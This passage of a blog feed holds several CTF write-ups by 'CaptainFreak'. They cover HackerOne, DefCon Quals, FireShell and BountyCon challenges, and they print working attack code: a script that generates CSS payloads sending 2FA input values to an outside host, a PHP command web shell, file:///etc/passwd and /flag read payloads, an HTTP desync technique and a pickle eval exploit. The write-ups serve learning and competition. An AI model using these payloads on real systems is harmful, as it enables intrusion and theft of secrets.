class="attr">value</span>=<span class="string">"4"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"5"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"6"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"7"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>So wrote a quick python script from above observations that generates payload CSS file which will exfiltrate the values from all of &#x3c;input&#x3e; tags at once and will tell us the sequence of their occurrence too.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># $ python ./css_exp.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2FA gotta be Alphanumeric</span></span><br><span class="line">alpha_num = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"</span></span><br><span class="line">exploit = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#For each of 7 input tags</span></span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">  pos = str(pos)</span><br><span class="line">  <span class="comment">#For each alpha numeric character</span></span><br><span class="line">  <span class="keyword">for</span> char <span class="keyword">in</span> alpha_num:</span><br><span class="line">    exploit += <span class="string">'''input[value="'''</span>+char+<span class="string">'''"]:nth-of-type('''</span>+pos+<span class="string">''')&#123;</span></span><br><span class="line"><span class="string">    background-image:url("https://tunnel.shoebpatel.com/?position='''</span>+pos+<span class="string">'''&amp;char='''</span>+char+<span class="string">'''");</span></span><br><span class="line"><span class="string">&#125;\n'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"2fa-exploit.css"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> file:</span><br><span class="line">  file.write(exploit)</span><br></pre></td></tr></table></figure>
<p>As soon as we send our <code>2fa-exploit.css</code>, we get 7 hits:</p>
<img src="/2020/06/19/HackerOne-2006-CTF-Writeup/ngrok_exfill.png" title="ngrok">
<p>Assembling them in sequence gives us the 2FA code: <strong>RT8i1EC</strong> </p>
<p>And, Pwned! üí£</p>
<img src="/2020/06/19/HackerOne-2006-CTF-Writeup/flag.png" title="ngrok">
<p>We finally get the message that we completed the challenge and the PoC Flagüö©:<br><strong>\^FLAG\^736c635d8842751b8aafa556154eb9f3\$FLAG\$</strong> ü§ò</p>
<h2 id="The-End"><a href="#The-End" class="headerlink" title="The End"></a>The End</h2><p>Thanks for reading, I tried as much as I could to make this a short read without missing details and the rabbit holes that I followed. I wanted to showcase all of my depth-first approaches but at the time of writing this up, already some days have passed and I forgot some of them. I hope you enjoyed reading it as much as I loved solving this challenge.</p>
<p>- CaptainFreak</p>
]]></content>
      
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WebSecurity </tag>
            
            <tag> Hacking </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[DefCon CTF Quals 2020 - HTTP Desync between HAProxy & Gunicorn]]></title>
      <url>/2020/05/18/DefCon-CTF-2020-HTTP-Desync-between-HAProxy-Gunicorn/</url>
      <content type="html"><![CDATA[<h2 id="DefCon-2020-CTF-Quals"><a href="#DefCon-2020-CTF-Quals" class="headerlink" title="DefCon 2020 CTF Quals"></a>DefCon 2020 CTF Quals</h2><p>A <a href="https://ctftime.org/event/994" target="_blank" rel="noopener">CTF</a> by <a href="https://oooverflow.io/" target="_blank" rel="noopener">Order of the Overflow</a>.</p>
<img src="/2020/05/18/DefCon-CTF-2020-HTTP-Desync-between-HAProxy-Gunicorn/logo.png" title="DC CTF Logo">
<p>The CTF had a web challenge, <code>uploooadit</code> which I quite liked due to my affection towards the attack of <a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" target="_blank" rel="noopener">HTTP Desync</a>.</p>
<h2 id="The-Challenge"><a href="#The-Challenge" class="headerlink" title="The Challenge"></a>The Challenge</h2><p>The Flask application (<a href="app.py">app.py</a>, <a href="store.py">store.py</a>) given had two endpoints:</p>
<h5 id="1-POST-files"><a href="#1-POST-files" class="headerlink" title="1. POST /files/"></a>1. POST /files/</h5><p>The endpoint was used to save plain-text files to the blob storage. It took <code>Content-Type: text/plain</code> and a custom header <code>X-guid</code> containing an <code>id</code>, an identifier for the files to fetch them later. A valid request looked like this:</p>
<img src="/2020/05/18/DefCon-CTF-2020-HTTP-Desync-between-HAProxy-Gunicorn/post.png" title="POST request">
<p><br></p>
<h5 id="2-GET-files-x3c-guid-x3e"><a href="#2-GET-files-x3c-guid-x3e" class="headerlink" title="2. GET /files/&#x3c;guid&#x3e;"></a>2. GET /files/&#x3c;guid&#x3e;</h5><p>Provided the valid <code>guid</code>, we get to fetch our saved file with this endpoint:</p>
<img src="/2020/05/18/DefCon-CTF-2020-HTTP-Desync-between-HAProxy-Gunicorn/get.png" title="GET request">
<p><br></p>
<h5 id="0-Invalid-request"><a href="#0-Invalid-request" class="headerlink" title="0. Invalid request"></a>0. Invalid request</h5><p>And if we send an invalid request to the invalid endpoint, we reveal the frontend HTTP server being used:</p>
<img src="/2020/05/18/DefCon-CTF-2020-HTTP-Desync-between-HAProxy-Gunicorn/time-out.png" title="inavlid request">
<p>So we have a Frontend Server <code>haproxy 1.9.10</code> and a backend app is written in <code>Flask</code> which is served by the Gunicorn WSGI.</p>
<p>After the usual assessment, the simple scenario and code leaves us with only the situation of testing it for HTTP Desync between HAProxy and Gunicorn. </p>
<p>The Desync can only help us in poisoning the sockets of the backend server, But if we assume that there can be a Bot that is hitting the backend server in intervals with the flag in it‚Äôs HTTP request, then the whole scenario starts making sense.</p>
<p>But first, let‚Äôs get the HTTP Desync working. The piece <a href="https://nathandavison.com/blog/haproxy-http-request-smuggling" target="_blank" rel="noopener">here</a> by <a href="https://twitter.com/nj_dav" target="_blank" rel="noopener">Nathan Davison</a> came in handy.</p>
<p>As it turns out, the combination of HAProxy and Gunicorn is Vulnerable to CL-TE HTTP desync, what we mean by that is, we can send the <code>Content-Length</code>(CL) and <code>Transfer-Encoding</code>(TE) together but if we malform the value of <code>Transfer-Encoding</code> a little bit by pre-pending non-printable character like ‚Äú\x0b‚Äù (vertical tab) or ‚Äú\x0c‚Äù (form feed), HAProxy will ignore the header and give precedence to CL header but when this is passed to Gunicorn it will parse the TE header correctly and give precedence to that, So if we send a Raw Request like following:</p>
<img src="/2020/05/18/DefCon-CTF-2020-HTTP-Desync-between-HAProxy-Gunicorn/exploit.png" title="GET request">
<p><br></p>
<p>As the HAProxy parses<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Length: 187                                                    </span><br><span class="line">Transfer-Encoding:\vchunked</span><br></pre></td></tr></table></figure></p>
<p>It only considers the CL header and sends the <code>second request as the body to Gunicorn</code> </p>
<p>But when the Gunicorn parses the TE header, It breaks the above raw request in 2 POST requests.<br>One of which is normal and complete request till the <code>0</code> byte chunk of Transfer-Encoding and where the second request is our poison for the TCP socket which has <code>Content-Length: 385</code>. The Gunicorn will wait for the next HTTP/TCP packet till the length of 385 is reached.</p>
<p>And as we had assumed, what if we had a Flag BOT which submits HTTP request to the backend after some interval, we can steal its request by making it fall after our poison if it does then the raw HTTP request by the BOT will become our Poison HTTP request‚Äôs body and will be perfectly stored through <code>POST /files</code> endpoint for us to steal through <code>GET /files/2aaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa</code><br>Let‚Äôs check it out :)</p>
<p>The Exploit request with <code>Transfer-Encoding:\vchunked</code></p>
<img src="/2020/05/18/DefCon-CTF-2020-HTTP-Desync-between-HAProxy-Gunicorn/exploiting.png" title="GET request">
<p>And we get the the flag üö©at <code>GET /files/2aaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa</code></p>
<img src="/2020/05/18/DefCon-CTF-2020-HTTP-Desync-between-HAProxy-Gunicorn/flag.png" title="flag">
<p>HTTP Desync is quite fun and prevalent considering the modern architecture that web apps are built on these days.<br>It was a fun challenge. Definitely some rabbit holes followed in previous CTFs on HTTP Desync helped me out in solving this one in minutes. </p>
<p>On another note, I play for <a href="https://underdawgs.in/" target="_blank" rel="noopener">UnderDawgs</a>, if you are looking for a team and are a nerd for maths, crypto, and reversing, please hit us up.</p>
<p>„Äå‰Ωé„ÅÑÂèØËÉΩÊÄß„ÅØ„Çº„É≠„Åß„ÅØ„Å™„ÅÑ„Åì„Å®„ÇíÊÑèÂë≥„Åó„Åæ„Åô„Äç<br>CaptainFreak</p>
]]></content>
      
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WebSecurity </tag>
            
            <tag> Hacking </tag>
            
            <tag> HTTP-Desync </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[FireShell CTF 2020 Write-up]]></title>
      <url>/2020/03/23/FireShell-CTF-2020-Write-up/</url>
      <content type="html"><![CDATA[<h2 id="FireShell-2020"><a href="#FireShell-2020" class="headerlink" title="FireShell 2020"></a>FireShell 2020</h2><p>A <a href="https://ctftime.org/event/944" target="_blank" rel="noopener">CTF</a> by <a href="https://fireshellsecurity.team/about/" target="_blank" rel="noopener">FireShell Security Team</a>.</p>
<img src="/2020/03/23/FireShell-CTF-2020-Write-up/fireshell.gif" title="FireShell Security">
<p><a href="https://underdawgs.in/" target="_blank" rel="noopener">UnderDawgs</a> performed well as a team in this one. üòé</p>
<h2 id="CTF-Writeup"><a href="#CTF-Writeup" class="headerlink" title="CTF Writeup"></a>CTF Writeup</h2><p>I mainly focused on <code>Web</code>, <code>Misc</code> and <code>Recon</code> challenges during the CTF.</p>
<h3 id="1-URL-to-PDF"><a href="#1-URL-to-PDF" class="headerlink" title="1. URL to PDF"></a>1. URL to PDF</h3><p>The service was making PDFs of webpages at a given URL. Hence we have a scenario of SSRF here. Confirmed the <code>SSRF</code> and the <code>User-Agent</code> involved in PDF making using Burp Collaborator.</p>
<img src="/2020/03/23/FireShell-CTF-2020-Write-up/burp-pdf.png" title="SSRF and User-Agent">
<p>So we now know that <code>[WeasyPrint 51](http://weasyprint.org/)</code> is being used in the Backend.<br>I was aware of the <a href="https://youtu.be/o-tL9ULF0KI?t=1109" target="_blank" rel="noopener">awesome research</a> on PDF generators by <a href="https://twitter.com/NahamSec" target="_blank" rel="noopener">@nahamsec</a> and <a href="https://twitter.com/daeken" target="_blank" rel="noopener">@daeken</a>.<br>But just somehow ignored revisiting it :( and forgot that they had mentioned about weasyprint. I directly started scouring Documentation, found some interesting things like <a href="https://weasyprint.readthedocs.io/en/stable/tutorial.html#access-to-local-files" target="_blank" rel="noopener">this</a> and fuzzed around them and nothing worked. I even fuzzed with Javascript and later got to know that it does not support JS at all.<br>Digging more deep in documentation gave this interesting functionality<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Attachments are related files, embedded in the PDF itself. They can be specified through &lt;link rel=attachment&gt; elements to add resources globally or through regular links with &lt;a rel=attachment&gt; to attach a resource that can be saved by clicking on said link. The title attribute can be used as description of the attachment.</span><br></pre></td></tr></table></figure></p>
<p>It says that we can use anchor and link tag to embed files as an attachment in generated PDFs and attachments can be fetched from a PDF easily. Fuzzed a bit and got the following code working to read local files :)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Captain&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;a rel=&apos;attachment&apos; href=&apos;file:///etc/passwd&apos;&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
<p>This will embed <code>/etc/passwd</code> in the generated pdf and we can extract it easily. It worked.<br>Now I should be able to read the flag at <code>file:///home/ctf/flag</code> as this is the location of the flag mentioned by admins. Nope, I tried for hours to read and downloaded multiple PDFs, fuzzed with more methods and the flag was at <code>file:///flag</code>. (‚ïØ¬∞‚ñ°¬∞)‚ïØÔ∏µ ‚îª‚îÅ‚îª</p>
<h3 id="2-CaaS"><a href="#2-CaaS" class="headerlink" title="2. CaaS"></a>2. CaaS</h3><p>Compiler as a Service.<br>It was taking valid C/C++ code, compiling it and giving us binary as downloadable.<br>This was supposed to be easy but my overthinking programmer mind wanted to explore without even using the service first.<br>I started searching for ways to read and retain files in the binaries at compile time. All the ways seemed tuff.<br>I came back to service and saw that the compile-time errors were too verbose and were returned back to us.<br>This means if we let it <code>#include</code> an invalid header file, we will get the content of the line where the error happened. A good candidate is <code>/flag</code> file which has only one line and that too is not valid C code. Done!</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;/flag&quot;</span><br></pre></td></tr></table></figure>
<h3 id="3-wfPM"><a href="#3-wfPM" class="headerlink" title="3. wfPM"></a>3. wfPM</h3><p>Work force and Program management. The challenge author tried quite well to hide what this product was. But upon several observations on cookies and JS files, I found out that this was <a href="http://qdpm.net/" target="_blank" rel="noopener">qdPM v9.1</a>.<br>This has several <a href="https://www.cvedetails.com/product/36411/Qdpm-Qdpm.html?vendor_id=16223" target="_blank" rel="noopener">CVEs</a>. The Post-RCE and info disclosure ones looked interesting.<br>The RCE was in User profile picture upload functionality and it was a good candidate to read local flag file but we need a legit account on the app first and there was no visible signup feature. I tried replacing <code>/index.php/login</code> with <code>/index.php/signup</code> and <code>index.php/register</code> etc. but no luck there.<br>For some time I thought of somehow using Info disclosure CVEs to disclose already present accounts.<br>The SQL error logs from this info disclosures were hinting towards 0-Day SQli (as this is an obscure PHP app) Followed that rabbit hole for a while.<br>Then my team-mate <a href="https://twitter.com/behroznathwani" target="_blank" rel="noopener">@Behroz</a> easily got logged in to the app and was asking doubt and sharing screenshots of Post-Login dashboard, I was like WTF ü§î (when did he became so 1337), how did he get logged in successfully. He shared that the Author has created backdoor signup at <code>/regiter.php</code> and hinted about it in <code>/robots.txt</code> :) Lol.<br>This is where even Top 10 teams were stuck! Nobody did basic Recon. </p>
<p>Signed up and uploaded <code>shell.php</code> in profile picture:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php if(isset($_REQUEST[&apos;cmd&apos;]))&#123; echo &quot;&lt;pre&gt;&quot;; $cmd = ($_REQUEST[&apos;cmd&apos;]); system($cmd); echo &quot;&lt;/pre&gt;&quot;; die; &#125;?&gt;</span><br></pre></td></tr></table></figure>
<p>The backend was checking for the file extension, bypassed it with <code>shell.php.png</code>. </p>
<h3 id="4-Screenshoter"><a href="#4-Screenshoter" class="headerlink" title="4. Screenshoter"></a>4. Screenshoter</h3><p>The author gave a webpage screenshotting tool as a service.<br>This is similar to URL to PDF, It was <code>URL to PNG</code>.<br>Screenshotted my Burp collaborator endpoint and got to know that they were using <code>PhantomJS</code> to generate web page screenshots. :)</p>
<p>Now unlike <code>WeasyPrint</code> client, PhantomJs supports JS execution in webpages. Used following JS to read local file:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Captain&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">flag=new XMLHttpRequest;flag.onload=function()&#123;document.write(this.responseText)&#125;;flag.open(&quot;GET&quot;,&quot;file:///flag&quot;);flag.send();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<hr>

<p>Another simple Sanity check challenge was related to social media recon, A QR code containing Flag in an image was upload to all the social media channels of the FireShell team.</p>
<h2 id="Writeups-by-Team-mates"><a href="#Writeups-by-Team-mates" class="headerlink" title="Writeups by Team-mates"></a>Writeups by Team-mates</h2><ol>
<li>Cars - Android Challenge - by <a href="https://twitter.com/pwnchief" target="_blank" rel="noopener">@pwnchief</a> - <a href="https://pwnchief.com/cars-writeup-fireshell-ctf-2020/" target="_blank" rel="noopener">Link</a></li>
<li>Coming Soon ..</li>
</ol>
<p>P.S. UnderDawgs placed 25th. </p>
<p>During this CTF, I learned a lot by following rabbit holes.<br>Excited to UpSolve the unsolved challenges üòã.<br>Coming to know that every other CTF has a different vibe and learning opportunities.</p>
<p>Previous CTF by <a href="https://twitter.com/p4_team" target="_blank" rel="noopener">p4 team</a> taught that good teams don‚Äôt keep anything purposeless in a challenge, everything can be used in them. WriteUp <a href="https://github.com/TeamUnderdawgs/CTF-Docs/tree/master/CONfidence-Teaser-2020/Web" target="_blank" rel="noopener">here</a>.</p>
<p>Progress, not Perfection,<br>CaptainFreak</p>
]]></content>
      
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WebSecurity </tag>
            
            <tag> Hacking </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Facebook's BountyCon 2020 CTF Writeup]]></title>
      <url>/2020/01/31/Facebooks-BountyCon-2020-CTF-Writeup/</url>
      <content type="html"><![CDATA[<h2 id="BountyCon2020"><a href="#BountyCon2020" class="headerlink" title="BountyCon2020"></a>BountyCon2020</h2><p>BountyCon is an invitation-only application security conference arranged by Facebook annually in Singapore for the BugBounty Community of Asia-Pacific region.</p>
<p>For more information about it, check <a href="https://www.facebook.com/whitehat/ctf/bountycon2020/" target="_blank" rel="noopener">here.</a></p>
<p>BountyCon2020 is the second edition. I was lucky enough to win an all-sponsored invitation from Facebook to attend the last edition and it was just an amazing experience filled with lots of hacking, knowledge sharing, traveling around Singapore, networking and hacking discussions over food and drinks with fellow bug bounty hunters and talented hackers from all over the world. It can‚Äôt get better than that for a Hacker. </p>
<p>Shoutout to Hackers who made that trip a memorable one. <a href="https://twitter.com/prateek_0490" target="_blank" rel="noopener">Prateek Tiwari</a>, <a href="https://twitter.com/bhavukjain1" target="_blank" rel="noopener">Bhavuk Jain</a>, <a href="https://twitter.com/iamnoooob" target="_blank" rel="noopener">Rahul Maini</a>, <a href="https://twitter.com/HivarekarPranav" target="_blank" rel="noopener">Pranav Hivarekar</a>, <a href="https://twitter.com/sehacure" target="_blank" rel="noopener">Anand Prakash</a> and everyone else from <a href="https://twitter.com/Inbughunters" target="_blank" rel="noopener">Indian Bug Hunters</a> Community.</p>
<p>To get an invite, one has to top the leaderboard of <a href="https://www.facebook.com/whitehat/ctf/bountycon2020/rules/" target="_blank" rel="noopener">BountyCon CTF</a>. </p>
<h2 id="CTF-Writeup"><a href="#CTF-Writeup" class="headerlink" title="CTF Writeup"></a>CTF Writeup</h2><p>Following is a writeup for a challenge that I really liked solving and learned some new things in the process.</p>
<h3 id="1-Tick-Tock"><a href="#1-Tick-Tock" class="headerlink" title="1. Tick-Tock"></a>1. Tick-Tock</h3><p>This was a white-box challenge around a python library. Code for an AWS lambda function was given which was vulnerable to arbitrary unpickling of Python Objects through pickle serialization library. </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class Epoch(object):</span><br><span class="line">    def __init__(self, timestamp):</span><br><span class="line">        self.ts = timestamp</span><br><span class="line"></span><br><span class="line">epoch = Epoch(&apos;&#123;:d&#125;&apos;.format(int(time.time())))</span><br><span class="line">cookie = base64.b64encode(pickle.dumps(epoch))</span><br></pre></td></tr></table></figure>
<p>The possible arbitrary code execution exploitation of pickle library was shut down by use of Lambda‚Äôs function shield which would block all the read, write, outbound connectivity and child process creation attempts. </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function_shield.configure(&#123;</span><br><span class="line">    &quot;policy&quot;: &#123;</span><br><span class="line">        &quot;outbound_connectivity&quot;: &quot;block&quot;,</span><br><span class="line">        &quot;read_write_tmp&quot;: &quot;block&quot;,</span><br><span class="line">        &quot;create_child_process&quot;: &quot;block&quot;,</span><br><span class="line">        &quot;read_handler&quot;: &quot;block&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>The flag for the challenge was in a globally initialized variable. </p>
<p>Pseudo-Code of the execution was like the following:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">If cookie is not set:</span><br><span class="line">    - Initialize an Object of Epoch class with the timestamp.</span><br><span class="line">    - Pickle this Object and set it as a cookie.</span><br><span class="line">    - Send the response with an empty body.</span><br><span class="line">Else:</span><br><span class="line">    - Unpickle the cookie value.</span><br><span class="line">    - Get the timestamp value from the cookie.</span><br><span class="line">    - Send a page with HTML which shows timer using this timestamp variable.</span><br></pre></td></tr></table></figure>
<p>So in a nutshell, whatever gets assigned to the timestamp variable of Epoch Class gets reflected into the HTML source. This was the trick to solve the challenge. We somehow had to trick the code into initializing the reflection with the flag variable and we had unpickling as a way to do it.</p>
<p>To arrive at the following <code>solution</code>, I scoured through the original documentation of pickle <a href="https://docs.python.org/3/library/pickle.html" target="_blank" rel="noopener">docs</a>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class Epoch(object):</span><br><span class="line">    def __init__(self, timestamp):</span><br><span class="line">        self.ts = timestamp</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (eval, ((&apos;Epoch(flag)&apos;),))</span><br><span class="line"></span><br><span class="line">def lambda_handler(event,con):</span><br><span class="line">    epoch = Epoch(&quot;31337&quot;)</span><br><span class="line">    cookie = base64.b64encode(pickle.dumps(epoch))</span><br><span class="line">    </span><br><span class="line">    return &#123;</span><br><span class="line">        &apos;statusCode&apos;: 200,</span><br><span class="line">        &apos;Exploit-Cookie&apos;: cookie</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>To manipulate it, we have the <code>__reduce__</code> method which will govern the object creation upon successful unpickling. The above code returns a tuple with the first argument being the callable and second being the argument. The result of unpickling the pickled byte-stream of the above class‚Äôs instance will be <code>eval(&#39;Epoch(flag)&#39;)</code> getting executed and the result of eval getting directly returned.</p>
<p>In this case, it will be an instance of Epoch class getting initialized with flag variable and the variable containing flag string will get reflected into the HTML by the following code.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">epoch = pickle.loads(base64.b64decode(</span><br><span class="line">    event[&apos;multiValueHeaders&apos;][&apos;cookie&apos;][0]))</span><br><span class="line">return &#123;</span><br><span class="line">   &apos;body&apos;: clock_page(epoch.ts)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>So with our exploit, it will indirectly mean,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">epoch = Epoch(flag)</span><br></pre></td></tr></table></figure>
<p>In this way, we successfully get the value of the flag variable in the <code>ts</code>  class variable.</p>
<p><hr></p>
<hr>

<p><strong>Following are the challenges that were not much exciting compared to tick-tock:</strong></p>
<h3 id="2-Lighthouse"><a href="#2-Lighthouse" class="headerlink" title="2. Lighthouse"></a>2. Lighthouse</h3><p>Challenge had an android app. Upon reversing and analyzing the apk, It was clear that the app is taking flag string from native code, changing it to morse code string and using it to light the flash of the phone.<br>I had multiple ideas to solve it but I solved it by using a <a href="https://github.com/matja/video-morse-decode" target="_blank" rel="noopener">C++ tool</a> which converts a video to morse code. I was not very sure that it was good enough to detect the morse code from the video stream of phone flash But I gave it a try anyway, The code is outdated and hence it was not getting compiled, made some tweaks to the C++ code so that it should compile. I recorded a video of phone flashing and fed it the compiled binary. It worked like a charm.</p>
<h3 id="3-Shake-it"><a href="#3-Shake-it" class="headerlink" title="3. Shake it"></a>3. Shake it</h3><p>This also was consisting of an android app.  As its name suggests, It was counting down the 10 million shakes of the phone and upon completion of those many shakes, it would reveal the flag string stored in native code.<br>Decompiled the apk using <code>apktool</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apktool d shake-it.apk</span><br></pre></td></tr></table></figure>
<p>updated the smali code which was initializing this counter of 10 mils. to 10.</p>
<p>0xF4240 -&gt; 0xA in the MainActivity.smali</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> // In MainActivity.smali</span><br><span class="line">.field private static final TARGET:I = 0xF4240</span><br><span class="line"></span><br><span class="line">  			to</span><br><span class="line"></span><br><span class="line">.field private static final TARGET:I = 0xA</span><br></pre></td></tr></table></figure>
<p>Built the apk again.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apktool b shake-it -o shake-it-modified.apk</span><br></pre></td></tr></table></figure>
<p>Self-signed it.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ keytool -genkey -v -keystore key.keystore -alias self -keyalg RSA -keysize 2048 -validity 10000</span><br><span class="line"></span><br><span class="line">$ jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore shake-it-modified.apk self</span><br></pre></td></tr></table></figure>
<p>Installed the apk and shaken the phone ten times, got the flag!</p>
<h3 id="4-Who‚Äôs-Sequel"><a href="#4-Who‚Äôs-Sequel" class="headerlink" title="4. Who‚Äôs Sequel"></a>4. Who‚Äôs Sequel</h3><p>This challenge had a login form. Upon fuzzing it was clear that it was vulnerable to Blind SQLi. Dumping the table using SQLMap revealed the flag in the last row of one of the tables.</p>
<h3 id="5-Heart-of-Stone"><a href="#5-Heart-of-Stone" class="headerlink" title="5. Heart of Stone"></a>5. Heart of Stone</h3><p>The Challenge name and Server header in response gave away the hint of HeartBleed (CVE-2014-0160), Exploited and read the memory containing the flag.</p>
<hr>

<p>Due to work and other stuff, I don‚Äôt get much time to participate in CTFs for fun. But I recently formed a CTF team, <a href="https://github.com/TeamUnderdawgs" target="_blank" rel="noopener"><strong>UnderDawgs</strong></a> with <a href="https://twitter.com/0xrudrapratap" target="_blank" rel="noopener">Rudra</a> and <a href="https://twitter.com/ArbazKiraak" target="_blank" rel="noopener">Arbaz</a> and we are actively looking for people experienced in Pwn, Crypto and Reversing CTF challenges. If you think you can contribute to the team, Please reach out.</p>
<p>Thanks for reading.</p>
<p>Hack the Planet,<br>CaptainFreak</p>
]]></content>
      
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WebSecurity </tag>
            
            <tag> Hacking </tag>
            
            <tag> Facebook </tag>
            
            <tag> BugBounty </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CaptainFreak Experience #1 - HacktoberFest 2018]]></title>
      <url>/2018/10/20/CaptainFreak-Experience-1-HacktoberFest-2018/</url>
      <content type="html"><![CDATA[<p><br><br>Oh hello there, It‚Äôs your friendly neighbourhood hacker again :)<br><br><br><img src="https://media.giphy.com/media/2UA9gXDkCbKIKlLKxd/giphy-downsized.gif" alt=""></p>
<p><br></p>
<p>This raw post is supposed to be a documentation of my experiences in contributing to some of my favorite open source projects for HacktoberFest 2018.<br>Along the way I will try to give insights on how I did it, Expecting it might help someone kickoff and start learning from contributing to FOSS.</p>
